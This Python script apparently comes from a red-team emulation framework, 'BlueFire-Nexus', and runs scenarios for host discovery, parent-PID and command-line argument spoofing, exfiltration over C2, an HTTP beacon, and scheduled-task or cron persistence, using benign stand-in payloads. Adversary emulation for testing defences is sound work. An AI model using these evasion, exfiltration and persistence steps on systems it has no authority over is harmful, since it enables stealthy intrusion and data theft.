#!/usr/bin/env python3
# src/run_scenario.py

import argparse
import logging
import sys
from pathlib import Path
import tempfile
import random
from datetime import datetime
import psutil # Import psutil
import platform # Import platform
import time # Import time for sleep

# Add src directory to path to allow sibling imports
SRC_DIR = Path(__file__).parent.resolve()
if str(SRC_DIR) not in sys.path:
    sys.path.append(str(SRC_DIR))

from core.bluefire_nexus import BlueFireNexus
from core.config import config # Import the global config instance

# Setup basic logging configuration
log_level_str = config.get('general.log_level', 'INFO').upper()
log_level = getattr(logging, log_level_str, logging.INFO)
logging.basicConfig(level=log_level, 
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def run_basic_discovery_scenario(nexus: BlueFireNexus, args: argparse.Namespace):
    """Scenario: Perform basic network host discovery (ping scan)."""
    logger.info("Starting Basic Host Discovery Scenario...")
    
    targets = config.get('general.safeties.allowed_subnets', [])
    if not targets:
        logger.warning("No allowed_subnets found in config's general.safeties section. Skipping host discovery.")
        return
        
    logger.info(f"Targets for host discovery: {targets}")
    
    try:
        # Structure the operation data as expected by Discovery.discover
        operation_data = {
            "discover": {
                "host_discovery": {
                    "targets": targets
                    # Optional: Add "arguments": "-sn -T4 -PS22,80" to customize scan
                }
            }
        }
        
        logger.info(f"Executing Discovery module with operation data: {operation_data}")
        result = nexus.execute_operation("discovery", operation_data)
        
        # Log the structure of the results for analysis
        if result.get('status') == 'success' and result.get('results', {}).get('host_discovery'):
            host_discovery_results = result['results']['host_discovery']
            logger.info(f"Host Discovery finished. Nmap raw output summary: {host_discovery_results.get('nmap_run_stats')}")
            # Log discovered hosts (example structure, adjust based on actual nmap output)
            if 'scan' in host_discovery_results:
                 live_hosts = [host for host, data in host_discovery_results['scan'].items() if data.get('status', {}).get('state') == 'up']
                 logger.info(f"Live hosts found ({len(live_hosts)}): {live_hosts}")
            else:
                 logger.warning("No 'scan' data found in host discovery results.")
        else:
            logger.error(f"Host Discovery failed or returned unexpected results: {result}")
            
    except ImportError as e:
         logger.error(f"Error during Basic Discovery Scenario: {e}. Is the 'nmap' command installed and python-nmap library available?")
    except Exception as e:
        logger.error(f"Error during Basic Discovery Scenario: {e}", exc_info=True)

def run_evasion_test_scenario(nexus: BlueFireNexus, args: argparse.Namespace):
    """Scenario: Test Parent PID Spoofing technique."""
    logger.info("Starting PID Spoofing Evasion Test Scenario...")
    
    if platform.system() != "Windows":
        logger.warning("PID Spoofing test scenario is designed for Windows. Skipping.")
        return
        
    # --- Find a suitable Parent PID --- 
    parent_pid = None
    parent_name = "explorer.exe" # Target parent process
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] and proc.info['name'].lower() == parent_name.lower():
                parent_pid = proc.info['pid']
                logger.info(f"Found target parent process '{parent_name}' with PID: {parent_pid}")
                break
        if not parent_pid:
             logger.error(f"Target parent process '{parent_name}' not found. Cannot perform PID spoofing test.")
             return
             
    except Exception as e:
         logger.error(f"Error finding parent process PID using psutil: {e}", exc_info=True)
         return

    # --- Define Command to Run --- 
    # Make sure the path uses double backslashes or raw strings for Windows
    command_to_run = r"C:\Windows\System32\notepad.exe"
    logger.info(f"Command to execute with spoofed parent: {command_to_run}")
    
    # --- Execute PID Spoofing via DefenseEvasion Module --- 
    try:
        # Structure the operation data for the defense_evasion module
        operation_data = {
            "evade": { # Top-level key expected by run_evasion
                "technique": "pid_spoofing", 
                "details": {
                    "parent_pid": parent_pid, 
                    "command_to_run": command_to_run
                    # Add other optional details if supported by handler, e.g., "create_suspended": True
                }
            }
        }
        
        logger.info(f"Executing Defense Evasion module with operation data: {operation_data['evade']['details']}")
        result = nexus.execute_operation("defense_evasion", operation_data)
        
        # Log results, including the created process ID if successful
        created_pid = result.get("results", {}).get("pid_spoofing", {}).get("details", {}).get("created_process_id")
        if result.get('status') == 'success' and created_pid:
             logger.info(f"PID Spoofing successful! Process (PID: {created_pid}) created with parent PID {parent_pid}.")
             logger.info(f"Full Result: {result}")
             # Optional: Verify parent PID using psutil on the created_pid?
             # try:
             #     new_proc = psutil.Process(created_pid)
             #     actual_ppid = new_proc.ppid()
             #     logger.info(f"Verification: New process ({created_pid}) actual Parent PID is {actual_ppid}.")
             # except psutil.NoSuchProcess:
             #     logger.warning(f"Could not find created process {created_pid} for verification (might have exited quickly).")
             # except Exception as verr:
             #     logger.error(f"Error verifying parent PID: {verr}")
        else:
             logger.error(f"PID Spoofing failed or did not return expected results: {result}")
             
    except Exception as e:
        logger.error(f"Error during PID Spoofing Evasion Test Scenario: {e}", exc_info=True)

def run_scan_and_exfil_scenario(nexus: BlueFireNexus, args: argparse.Namespace):
    """Scenario: Discover hosts, then exfiltrate dummy data from first live host via C2."""
    logger.info(f"Starting Scan and Exfil Scenario (Method: {args.exfil})...")

    # --- Step 1: Discover Hosts --- 
    targets = config.get('general.safeties.allowed_subnets', [])
    if not targets:
        logger.error("No allowed_subnets found in config. Cannot run Scan and Exfil scenario.")
        return

    live_hosts = []
    try:
        logger.info(f"Running host discovery for targets: {targets}")
        discovery_op_data = {"discover": {"host_discovery": {"targets": targets}}}
        discovery_result = nexus.execute_operation("discovery", discovery_op_data)

        if discovery_result.get('status') == 'success' and discovery_result.get('results', {}).get('host_discovery'):
            host_results = discovery_result['results']['host_discovery']
            if 'scan' in host_results:
                 live_hosts = [host for host, data in host_results['scan'].items() if data.get('status', {}).get('state') == 'up']
                 logger.info(f"Discovery found {len(live_hosts)} live hosts: {live_hosts}")
            else:
                 logger.warning("No 'scan' data in host discovery results.")
        else:
            logger.error(f"Host Discovery step failed: {discovery_result}")
            return # Cannot proceed without discovery results

    except Exception as e:
        logger.error(f"Error during Discovery step: {e}", exc_info=True)
        return

    if not live_hosts:
        logger.warning("No live hosts found by discovery. Exfiltration step skipped.")
        return

    # --- Step 2: Prepare for Exfiltration --- 
    # For this example, we won't actually collect files from the target.
    # We'll simulate finding data and exfiltrate a dummy file created locally.
    # A real scenario would involve running remote commands via C2 to find/stage files.
    
    # Create a dummy file to exfiltrate
    dummy_file_content = f"Simulated exfil data for profile {args.profile} at {datetime.now().isoformat()}\n" + "\n".join(live_hosts)
    dummy_file_path = Path(tempfile.gettempdir()) / f"simulated_exfil_{random.randint(1000,9999)}.txt"
    try:
        with open(dummy_file_path, "w") as f:
            f.write(dummy_file_content)
        logger.info(f"Created dummy data file for exfil: {dummy_file_path}")
    except Exception as e:
        logger.error(f"Failed to create dummy exfil file: {e}")
        return

    # --- Step 3: Execute Exfiltration via C2 --- 
    # We'll use the exfil method passed via command line args (--exfil)
    exfil_method = f"via_c2" # Currently the only implemented method sending data
    # In future, could map args.exfil (e.g., 'dns') to specific C2 channel config? For now, assume default C2.
    
    try:
        exfil_op_data = {
            "exfiltrate": {
                "method": exfil_method, # Use the specified C2 method
                "details": {
                    "paths": [str(dummy_file_path)], # Target the dummy file
                    "patterns": ["*.txt"],
                    "recursive": False, # Not needed for single file
                    "max_files": 1,
                    "archive_format": "zip", # Archive the single file
                    "archive_password": "bluefire_test" # Optional: Password protect
                    # Add target info if needed by C2 module? e.g., "target_host": live_hosts[0]
                }
            }
        }
        
        logger.info(f"Executing Exfiltration module ({exfil_method}) with op data: {exfil_op_data['exfiltrate']['details']}")
        exfil_result = nexus.execute_operation("exfiltration", exfil_op_data)
        logger.info(f"Exfiltration Result: {exfil_result}")

    except Exception as e:
        logger.error(f"Error during Exfiltration step: {e}", exc_info=True)
    finally:
        # --- Step 4: Cleanup --- 
        try:
            if dummy_file_path.exists():
                dummy_file_path.unlink()
                logger.info(f"Cleaned up dummy exfil file: {dummy_file_path}")
        except Exception as e:
            logger.warning(f"Failed to cleanup dummy exfil file {dummy_file_path}: {e}")

def run_argument_spoofing_test_scenario(nexus: BlueFireNexus, args: argparse.Namespace):
    """Scenario: Test Command-Line Argument Spoofing technique."""
    logger.info("Starting Argument Spoofing Evasion Test Scenario...")
    
    if platform.system() != "Windows":
        logger.warning("Argument Spoofing test scenario currently simulates Windows behavior. Skipping on non-Windows.")
        return
        
    # --- Define Real Command and Spoofed Appearance --- 
    # Example: Run PowerShell script but make it look like a simple command
    real_command = r"powershell.exe -ExecutionPolicy Bypass -NoProfile -File C:\temp\malicious_script.ps1" 
    spoofed_appearance = r"powershell.exe -Command \"Get-Service -Name BITS\""
    
    # Create a dummy script file for the real command to execute
    dummy_script_content = "Write-Host 'This is the malicious script running!'\nStart-Sleep -Seconds 5" # Simulate some work
    dummy_script_path = Path(r"C:\temp\malicious_script.ps1")
    try:
        dummy_script_path.parent.mkdir(parents=True, exist_ok=True) # Ensure C:\temp exists
        with open(dummy_script_path, "w") as f:
            f.write(dummy_script_content)
        logger.info(f"Created dummy PowerShell script for testing: {dummy_script_path}")
    except Exception as e:
        logger.error(f"Failed to create dummy script file at {dummy_script_path}: {e}")
        return

    logger.info(f"Real command to execute: {real_command}")
    logger.info(f"Spoofed command line appearance: {spoofed_appearance}")
    
    # --- Execute Argument Spoofing via DefenseEvasion Module --- 
    try:
        operation_data = {
            "evade": {
                "technique": "argument_spoofing", 
                "details": {
                    "command_to_run": real_command, 
                    "spoofed_command_line": spoofed_appearance 
                }
            }
        }
        
        logger.info(f"Executing Defense Evasion module with operation data: {operation_data['evade']['details']}")
        result = nexus.execute_operation("defense_evasion", operation_data)
        
        # Log results
        if result.get('status') == 'success':
             logger.info(f"Argument Spoofing simulation successful. Command executed.")
             logger.info(f"Full Result: {result}")
        else:
             logger.error(f"Argument Spoofing simulation failed: {result}")
             
    except Exception as e:
        logger.error(f"Error during Argument Spoofing Evasion Test Scenario: {e}", exc_info=True)
    finally:
        # --- Cleanup --- 
        try:
            if dummy_script_path.exists():
                dummy_script_path.unlink()
                logger.info(f"Cleaned up dummy script file: {dummy_script_path}")
        except Exception as e:
            logger.warning(f"Failed to cleanup dummy script file {dummy_script_path}: {e}")

def run_c2_basic_tasking_scenario(nexus: BlueFireNexus, args: argparse.Namespace):
    """Scenario: Start C2 beacon, wait, potentially execute simulated task, stop beacon."""
    logger.info("Starting C2 Basic Tasking Scenario...")
    
    # --- Get C2 configuration from main config --- 
    c2_channels = config.get('modules.command_control.c2_channels', [])
    if not c2_channels:
        logger.error("No C2 channels defined in config (modules.command_control.c2_channels). Cannot start beacon.")
        return
        
    # Use the first defined HTTP channel for this basic scenario
    http_channel = None
    for channel in c2_channels:
        if channel.get('protocol') == 'http':
            http_channel = channel
            break
            
    if not http_channel or not http_channel.get('url'):
        logger.error("No HTTP C2 channel with a URL found in config. Cannot start beacon.")
        return

    beacon_id = f"beacon_tasking_{random.randint(100,999)}"
    c2_url = http_channel['url']
    interval = http_channel.get('interval_seconds', config.get('command_control.default_interval_seconds', 60))
    jitter = http_channel.get('jitter_percent', config.get('command_control.default_jitter_percent', 20))
    user_agent = http_channel.get('user_agent') # Optional in config, C2 module has default
    method = http_channel.get('method', 'POST') # Default to POST for task results/exfil
    verify_ssl = http_channel.get('verify_ssl', True)

    # --- Start Beacon --- 
    logger.info(f"Attempting to start beacon ({beacon_id}) to {c2_url} with interval ~{interval}s")
    start_op_data = {
        "operation": "start_http_beacon",
        "details": {
            "beacon_id": beacon_id,
            "c2_url": c2_url,
            "interval_seconds": interval,
            "jitter_percent": jitter,
            "user_agent": user_agent, # Pass None if not set, C2 module will use default
            "method": method,
            "verify_ssl": verify_ssl
            # Add headers if needed from config: "headers": http_channel.get('headers', {})
        }
    }
    start_result = {} 
    try:
        start_result = nexus.execute_operation("command_control", start_op_data)
        logger.info(f"Start Beacon Result: {start_result}")
        if start_result.get("status") != "success":
            logger.error("Failed to start C2 beacon thread. Aborting scenario.")
            return
    except Exception as e:
        logger.error(f"Error starting C2 beacon: {e}", exc_info=True)
        return
        
    # --- Wait for Beacon Cycles --- 
    # Wait long enough for at least one, potentially two beacons + task execution
    wait_time = interval * 2.5 # Allow for jitter and task time
    logger.info(f"Waiting {wait_time:.1f} seconds for beacon cycles...")
    time.sleep(wait_time)
    
    # --- Stop Beacon --- 
    logger.info(f"Attempting to stop beacon ({beacon_id})...")
    stop_op_data = {
        "operation": "stop_http_beacon",
        "details": {"beacon_id": beacon_id}
    }
    stop_result = {} 
    try:
        stop_result = nexus.execute_operation("command_control", stop_op_data)
        logger.info(f"Stop Beacon Result: {stop_result}")
    except Exception as e:
        logger.error(f"Error stopping C2 beacon: {e}", exc_info=True)
        
    logger.info("C2 Basic Tasking Scenario finished.")

def run_establish_persistence_scenario(nexus: BlueFireNexus, args: argparse.Namespace):
    """Scenario: Establish persistence using an OS-appropriate method."""
    logger.info("Starting Establish Persistence Scenario...")
    
    os_type = platform.system()
    persistence_technique = None
    details = {}
    command_to_persist = None

    if os_type == "Windows":
        persistence_technique = "scheduled_task" # Or "registry_run_key"
        # Define a simple command to persist (e.g., calc.exe)
        command_to_persist = r"C:\Windows\System32\calc.exe"
        details = {
            "task_name": f"BlueFireUpdateCheck_{random.randint(1000,9999)}",
            "command": command_to_persist,
            "trigger": "ONLOGON", # Persist on user logon
            "force": True,
            "description": "Checks for BlueFire updates (Persistence Test)"
        }
        # Example for Registry Key instead:
        # persistence_technique = "registry_run_key"
        # details = {
        #     "value_name": f"BlueFireUpdater_{random.randint(1000,9999)}",
        #     "command": command_to_persist,
        #     "hive": "HKCU",
        #     "key_type": "Run",
        #     "force": True
        # }
        
    elif os_type in ["Linux", "Darwin"]:
        persistence_technique = "cron_job"
        # Define a simple command to persist (e.g., create a file)
        timestamp_file = f"/tmp/bluefire_persist_{random.randint(1000,9999)}.log"
        command_to_persist = f"/bin/echo \"BlueFire persisted at $(date)\" >> {timestamp_file}"
        details = {
            "command": command_to_persist,
            "schedule": "@reboot", # Persist on reboot
            "comment": f"BlueFire Persistence Check {random.randint(1000,9999)}"
        }
    else:
        logger.warning(f"Persistence scenario not defined for OS: {os_type}. Skipping.")
        return

    logger.info(f"Attempting persistence via '{persistence_technique}' on {os_type}")
    logger.info(f"Command to persist: {command_to_persist}")
    
    # --- Execute Persistence --- 
    try:
        operation_data = {
            "persist": {
                "technique": persistence_technique, 
                "details": details
            }
        }
        
        logger.info(f"Executing Persistence module with operation data: {operation_data['persist']['details']}")
        result = nexus.execute_operation("persistence", operation_data)
        
        # Log results
        if result.get('status') == 'success':
             logger.info(f"Persistence ({persistence_technique}) established successfully.")
             logger.info(f"Full Result: {result}")
        else:
             logger.error(f"Persistence ({persistence_technique}) failed: {result}")
             
    except Exception as e:
        logger.error(f"Error during Establish Persistence Scenario: {e}", exc_info=True)

def main():
    parser = argparse.ArgumentParser(description="Run BlueFire-Nexus scenario")
    parser.add_argument('--profile', type=str, required=True, 
                        help='Scenario profile (e.g., basic_discovery, evasion_test, scan_and_exfil, arg_spoof_test, c2_basic_tasking, establish_persistence)')
    parser.add_argument('--ai', type=str, default="false", 
                        help='Enable AI features (true/false) - Currently informational')
    parser.add_argument('--exfil', type=str, default="dns", 
                        help='Default exfiltration method if needed by profile (e.g., dns, http)')
    
    args = parser.parse_args()
    
    logger.info(f"[BlueFire-Scenario] Profile: {args.profile}")
    logger.info(f"[BlueFire-Scenario] AI Features: {args.ai}")
    logger.info(f"[BlueFire-Scenario] Exfil Method Arg: {args.exfil}")

    try:
        # Initialize the core platform
        logger.info("Initializing BlueFireNexus platform...")
        nexus = BlueFireNexus() # Config is loaded automatically
        logger.info("BlueFireNexus platform initialized successfully.")

        # --- Scenario Dispatch --- 
        if args.profile == "basic_discovery":
            run_basic_discovery_scenario(nexus, args)
        elif args.profile == "evasion_test":
            run_evasion_test_scenario(nexus, args)
        elif args.profile == "scan_and_exfil":
             run_scan_and_exfil_scenario(nexus, args)
        elif args.profile == "arg_spoof_test":
             run_argument_spoofing_test_scenario(nexus, args)
        elif args.profile == "c2_basic_tasking":
             run_c2_basic_tasking_scenario(nexus, args)
        elif args.profile == "establish_persistence":
             run_establish_persistence_scenario(nexus, args)
        else:
            logger.error(f"Unknown scenario profile: {args.profile}")
            print(f"Error: Unknown profile '{args.profile}'. Available: basic_discovery, evasion_test, scan_and_exfil, arg_spoof_test, c2_basic_tasking, establish_persistence")
            sys.exit(1)

        logger.info(f"[BlueFire-Scenario] Profile '{args.profile}' execution finished.")

    except Exception as e:
        logger.critical(f"Fatal error during scenario execution: {e}", exc_info=True)
        sys.exit(1)

if __name__ == '__main__':
    main()
